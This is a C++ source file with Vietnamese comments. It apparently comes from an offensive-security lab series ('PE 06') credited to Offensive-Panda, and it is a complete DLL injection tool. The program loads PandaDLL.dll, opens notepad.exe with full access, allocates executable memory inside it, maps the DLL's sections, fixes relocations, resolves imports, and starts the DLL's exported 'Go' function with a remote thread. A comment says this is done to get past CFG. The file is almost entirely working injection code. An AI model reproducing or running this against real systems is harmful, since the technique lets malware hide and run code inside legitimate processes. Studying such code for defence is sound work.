#include <Windows.h>
#include <iostream>
#include <vector>
#include <memory>
#include <tlhelp32.h>
#include <string>
#include "data.h"

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

// Hàm tính toán độ lệch Virtual Address sang File Offset thô chuẩn tác giả
DWORD RvaToOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD rva) {
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (rva >= pSectionHeader[i].VirtualAddress && rva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize)) {
            return rva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;
        }
    }
    return 0;
}

void ReflectiveDLLInjectRemote(HANDLE hProcess, LPVOID dllBuffer, SIZE_T dllSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    // ĐỒNG BỘ ĐỊNH DANH: Đổi thành pNtHeaders để fix triệt để lỗi C2065
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    std::cout << "[*] Kich thuoc Image DLL bop tach: " << imageSize << " bytes." << std::endl;

    // 1. TỰ ĐỘNG BÓC TÁCH TỌA ĐỘ HÀM XUẤT KHẨU "Go" TỪ FILE THÔ
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportDirOffset = RvaToOffset(pNtHeaders, exportDirRVA);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBuffer + exportDirOffset);

    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNames));
    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfFunctions));
    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNameOrdinals));

    DWORD functionExportOffset = 0;
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        char* funcName = (char*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pdwNames[i]));
        if (strcmp(funcName, "Go") == 0) { // Săn lùng chính xác hàm mang tên Go của Offensive-Panda
            functionExportOffset = pdwFunctions[pwOrdinals[i]];
            break;
        }
    }

    if (functionExportOffset == 0) {
        std::cout << "[-] Khong tim thay ham xuat khau 'Go'. Tu dong chuyen ve dung EntryPoint mac dinh." << std::endl;
        functionExportOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    }
    else {
        std::cout << "[+] Da tim thay ham xuat khau 'Go' tai RVA Offset: 0x" << std::hex << functionExportOffset << std::endl;
    }

    // 2. CẤP PHÁT ĐỘNG THÍCH ỨNG TRÊN NOTEPAD
    LPVOID dllBase = VirtualAllocEx(hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!dllBase) {
        std::cout << "[*] Toa do ImageBase mac dinh bi trung. Tu dong xin vung nho trong moi..." << std::endl;
        dllBase = VirtualAllocEx(hProcess, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    if (!dllBase) {
        std::cerr << "[-] VirtualAllocEx that bai!" << std::endl;
        return;
    }

    std::cout << "[+] Vung nho Image tu xa da thiet lap tai: 0x" << std::hex << dllBase << std::endl;

    // 3. Đẩy phân đoạn Headers và các Sections sang lòng Notepad từ xa
    WriteProcessMemory(hProcess, dllBase, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeaders);
    for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
        LPVOID sectionSrc = (LPVOID)((DWORD_PTR)dllBuffer + section->PointerToRawData);
        WriteProcessMemory(hProcess, sectionDest, sectionSrc, section->SizeOfRawData, NULL);
        section++;
    }
    std::cout << "[+] Anh xa cac Sections tu xa hoan tat." << std::endl;

    // 4. Vá lỗi dịch chuyển địa chỉ ảo Base Relocations từ xa bằng bộ đệm an toàn
    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size) {
        LPVOID relocBase = (LPVOID)((DWORD_PTR)dllBase + relocDir.VirtualAddress);
        DWORD_PTR delta = (DWORD_PTR)dllBase - pNtHeaders->OptionalHeader.ImageBase;

        std::vector<BYTE> localRelocBuf(relocDir.Size);
        if (ReadProcessMemory(hProcess, relocBase, localRelocBuf.data(), relocDir.Size, NULL)) {
            DWORD relocOffset = 0;
            while (relocOffset < relocDir.Size) {
                PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)(localRelocBuf.data() + relocOffset);
                DWORD blockSize = block->BlockSize;
                if (blockSize == 0) break;

                PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)block + sizeof(BASE_RELOCATION_BLOCK));
                DWORD entriesCount = (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

                for (DWORD i = 0; i < entriesCount; i++) {
                    if (entries[i].Type == IMAGE_REL_BASED_HIGHLOW || entries[i].Type == IMAGE_REL_BASED_DIR64) {
                        DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)dllBase + block->PageAddress + entries[i].Offset);
                        DWORD_PTR currentVal = 0;
                        ReadProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
                        currentVal += delta;
                        WriteProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
                    }
                }
                relocOffset += blockSize;
            }
        }
        std::cout << "[+] Xu ly Base Relocation tu xa hoan tat." << std::endl;
    }

    // 5. Phân giải danh sách Imports Table (IAT) trực tiếp từ xa
    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size) {
        LPVOID importDesc = (LPVOID)((DWORD_PTR)dllBase + importDir.VirtualAddress);
        std::vector<IMAGE_IMPORT_DESCRIPTOR> localDescriptors(importDir.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR));

        if (ReadProcessMemory(hProcess, importDesc, localDescriptors.data(), importDir.Size, NULL)) {
            size_t descIdx = 0;
            while (localDescriptors[descIdx].Name) {
                char dllNameBuf[MAX_PATH] = { 0 };
                ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localDescriptors[descIdx].Name), dllNameBuf, MAX_PATH, NULL);

                HMODULE hImportDll = LoadLibraryA(dllNameBuf);
                if (hImportDll) {
                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + localDescriptors[descIdx].FirstThunk);
                    IMAGE_THUNK_DATA localThunk;
                    ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);

                    while (localThunk.u1.AddressOfData) {
                        DWORD_PTR resolvedAddr = 0;
                        if (IMAGE_SNAP_BY_ORDINAL(localThunk.u1.Ordinal)) {
                            DWORD ordinal = IMAGE_ORDINAL(localThunk.u1.Ordinal);
                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, (LPCSTR)(ULONG_PTR)ordinal);
                        }
                        else {
                            char funcNameBuf[256] = { 0 };
                            ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localThunk.u1.AddressOfData + sizeof(WORD)), funcNameBuf, 256, NULL);
                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, funcNameBuf);
                        }

                        WriteProcessMemory(hProcess, &(thunk->u1.Function), &resolvedAddr, sizeof(DWORD_PTR), NULL);
                        thunk++;
                        ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);
                    }
                }
                descIdx++;
            }
        }
        std::cout << "[+] Phan giai Imports Table (IAT) tu xa hoan tat." << std::endl;
    }

    // 6. KÍCH NỔ ĐƯỜNG HƯỚNG TỪ XA: Đâm thẳng Remote Thread vào tọa độ hàm "Go" xuất khẩu để phá băng CFG
    LPVOID remoteExecutionTarget = (LPVOID)((DWORD_PTR)dllBase + functionExportOffset);
    std::cout << "[*] Chuan bi kich no luong tu xa tai toa do: 0x" << std::hex << remoteExecutionTarget << std::endl;

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteExecutionTarget, NULL, 0, NULL);
    if (hThread) {
        // Cấu hình cờ đợi INFINITE kịch trần để gánh luồng sống an toàn
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        std::cout << "[+] DLL injected and Go() executed successfully inside Target!" << std::endl;
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << std::dec << GetLastError() << std::endl;
    }
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 06 REFLECTIVE DLL INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // 1. Mở và nạp tệp tin PandaDLL.dll
    HANDLE hFile = CreateFileA("PandaDLL.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Khong the mo file PandaDLL.dll. Hay dat file cung thu muc voi Reflective_DLL_Injection.exe nhen!" << std::endl;
        std::cout << "[*] Nhan Enter de dong..." << std::endl;
        std::cin.get();
        return 1;
    }

    DWORD dllSize = GetFileSize(hFile, NULL);
    std::unique_ptr<BYTE[]> dllBuffer(new BYTE[dllSize]);
    DWORD bytesRead;
    ReadFile(hFile, dllBuffer.get(), dllSize, &bytesRead, NULL);
    CloseHandle(hFile);

    std::cout << "[+] Da nap PandaDLL.dll vao bo dem tam." << std::endl;

    // 2. Săn lùng tiến trình Notepad tự động hoa thường
    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc." << std::endl;
        std::cin.get();
        return 1;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << std::dec << pid << std::endl;

    // 3. Mở kết nối quyền hạn cao cấu hình bộ nhớ chéo
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed." << std::endl;
        std::cin.get();
        return 1;
    }

    ReflectiveDLLInjectRemote(hProcess, dllBuffer.get(), dllSize);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();

    CloseHandle(hProcess);
    return 0;
}